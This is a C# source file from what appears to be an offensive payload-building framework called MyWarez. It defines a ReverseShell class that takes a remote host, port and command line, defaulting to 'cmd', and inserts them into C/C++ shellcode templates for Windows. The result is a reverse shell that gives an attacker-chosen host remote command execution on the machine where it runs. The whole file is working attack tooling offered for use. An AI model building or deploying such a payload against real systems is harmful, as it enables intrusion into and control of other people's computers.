using System.Collections.Generic;
using System.IO;

using MyWarez.Core;
using MyWarez.Base;

namespace MyWarez.Payloads
{
    public sealed class ReverseShell : ShellcodeCCxxSource, IShellcodeCCxxSourceIParameterlessCFunction
    {
        private static readonly string ResourceDirectory = Path.Join(Core.Constants.PayloadsResourceDirectory, "Windows", "Execution", "CommandAndScripting", nameof(ReverseShell));
        private static readonly string RemoteHostnamePlaceholder = Utils.StringToCArrary(@"127.0.0.1");
        private static readonly string RemotePortPlaceholder = Utils.StringToCArrary(@"4444");
        private static readonly string CmdlinePlaceholder = Utils.StringToCArrary(@"cmd");
        private static readonly string FunctionNamePlaceholder = "ReverseShell";
        public ReverseShell(
            string remoteHost, // Host can be a DNS name
            string remotePort,
            string cmdline="cmd")
            : base(SourceDirectoryToSourceFiles(ResourceDirectory))
        {
            FindAndReplace(SourceFiles, RemoteHostnamePlaceholder, Utils.StringToCArrary(remoteHost));
            FindAndReplace(SourceFiles, RemotePortPlaceholder, Utils.StringToCArrary(remotePort));
            FindAndReplace(SourceFiles, CmdlinePlaceholder, Utils.StringToCArrary(cmdline));
            FindAndReplace(SourceFiles, FunctionNamePlaceholder, ((ICFunction)this).Name);
        }

        string ICFunction.Name => FunctionNamePlaceholder + GetHashCode();
        public IEnumerable<string> ParameterTypes => null;

    }
}